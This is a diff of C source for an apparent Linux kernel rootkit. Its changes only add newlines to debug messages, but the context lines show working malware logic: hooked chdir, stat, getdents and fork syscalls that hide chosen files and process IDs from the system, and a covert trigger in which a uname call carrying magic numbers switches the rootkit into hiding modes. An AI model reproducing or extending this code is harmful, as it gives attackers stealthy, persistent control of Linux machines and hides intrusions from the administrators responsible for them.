@@ -42,7 +42,7 @@ static int is_inode_hidden(u64 ino)
 
 static void hide_inode(u64 ino)
 {
-	pr_debug("%s: ino=%llu", __func__, ino);
+	pr_debug("%s: ino=%llu\n", __func__, ino);
 
 	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
 		if (!hidden_inodes[i] || hidden_inodes[i] == ino) {
@@ -54,7 +54,7 @@ static void hide_inode(u64 ino)
 
 static void unhide_inode(u64 ino)
 {
-	pr_debug("%s: ino=%llu", __func__, ino);
+	pr_debug("%s: ino=%llu\n", __func__, ino);
 
 	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
 		if (hidden_inodes[i] == ino) {
@@ -88,7 +88,7 @@ static int is_pid_hidden(pid_t pid)
 
 static void hide_pid(pid_t pid)
 {
-	pr_debug("%s: pid=%d", __func__, pid);
+	pr_debug("%s: pid=%d\n", __func__, pid);
 
 	for (int i = 0; i < MAX_HIDDEN_PIDS; i++) {
 		if (!hidden_pids[i] || hidden_pids[i] == pid) {
@@ -100,7 +100,7 @@ static void hide_pid(pid_t pid)
 
 static void unhide_pid(pid_t pid)
 {
-	pr_debug("%s: pid=%d", __func__, pid);
+	pr_debug("%s: pid=%d\n", __func__, pid);
 
 	for (int i = 0; i < MAX_HIDDEN_PIDS; i++) {
 		if (hidden_pids[i] == pid) {
@@ -131,7 +131,7 @@ asmlinkage long new_sys_chdir(char *path)
 		return ret;
 
 	if (is_inode_hidden(st.st_ino)) {
-		pr_debug("%s: hiding inode %lu", __func__, st.st_ino);
+		pr_debug("%s: hiding inode %lu\n", __func__, st.st_ino);
 		return -ENOENT;
 	}
 
@@ -152,11 +152,11 @@ asmlinkage long new_sys_stat(char *path, struct stat *st)
 		return ret;
 
 	if (is_inode_hidden(tmp_st.st_ino)) {
-		pr_debug("%s: hiding inode %lu", __func__, tmp_st.st_ino);
+		pr_debug("%s: hiding inode %lu\n", __func__, tmp_st.st_ino);
 		return -ENOENT;
 	}
 	if (ksyms._copy_to_user(st, &tmp_st, sizeof(*st)))
-		pr_debug("%s: _copy_to_user failed", __func__);
+		pr_debug("%s: _copy_to_user failed\n", __func__);
 
 	return ret;
 }
@@ -174,11 +174,11 @@ asmlinkage long new_sys_lstat(char *path, struct stat *st)
 		return ret;
 
 	if (is_inode_hidden(tmp_st.st_ino)) {
-		pr_debug("%s: hiding inode %lu", __func__, tmp_st.st_ino);
+		pr_debug("%s: hiding inode %lu\n", __func__, tmp_st.st_ino);
 		return -ENOENT;
 	}
 	if (ksyms._copy_to_user(st, &tmp_st, sizeof(*st)))
-		pr_debug("%s: _copy_to_user failed", __func__);
+		pr_debug("%s: _copy_to_user failed\n", __func__);
 
 	return ret;
 }
@@ -196,11 +196,11 @@ asmlinkage long new_sys_fstatat(int fd, char *path, struct stat *st, int flag)
 		return ret;
 
 	if (is_inode_hidden(tmp_st.st_ino)) {
-		pr_debug("%s: hiding inode %lu", __func__, tmp_st.st_ino);
+		pr_debug("%s: hiding inode %lu\n", __func__, tmp_st.st_ino);
 		return -ENOENT;
 	}
 	if (ksyms._copy_to_user(st, &tmp_st, sizeof(*st)))
-		pr_debug("%s: _copy_to_user failed", __func__);
+		pr_debug("%s: _copy_to_user failed\n", __func__);
 
 	return ret;
 }
@@ -245,7 +245,7 @@ asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 		if (is_inode_hidden(d_ino)) {
 			r = ksyms._copy_to_user(d, (char *)d + d_reclen, ret - pos - d_reclen);
 			if (r) {
-				pr_debug("%s: _copy_to_user", __func__);
+				pr_debug("%s: _copy_to_user\n", __func__);
 				return -EFAULT;
 			} else {
 				ret -= d_reclen;
@@ -282,7 +282,7 @@ asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		if (is_inode_hidden(d_ino)) {
 			r = ksyms._copy_to_user(d, (char *)d + d_reclen, ret - pos - d_reclen);
 			if (r) {
-				pr_debug("%s: _copy_to_user", __func__);
+				pr_debug("%s: _copy_to_user\n", __func__);
 				return -EFAULT;
 			} else {
 				ret -= d_reclen;
@@ -552,7 +552,7 @@ asmlinkage long new_sys_fork(void)
 
 	pid = ksyms.old_sys_fork();
 	if (pid)
-		pr_debug("%s: pid=%d", __func__, pid);
+		pr_debug("%s: pid=%d\n", __func__, pid);
 
 	return pid;
 }
@@ -578,12 +578,12 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 	SYS_STATS_INC(uname);
 
 	if (ksyms._copy_from_user(&args, name, sizeof(args)))
-		pr_debug("%s: _copy_from_user failed", __func__);
+		pr_debug("%s: _copy_from_user failed\n", __func__);
 
 	if (args.magic_number_1 != MAGIC_NUMBER_1 || args.magic_number_2 != MAGIC_NUMBER_2)
 		return ksyms.old_sys_uname(name);
 
-	pr_debug("%s: magic number reveived", __func__);
+	pr_debug("%s: magic number reveived\n", __func__);
 
 	switch (args.mode) {
 	case HIDE_INODE:
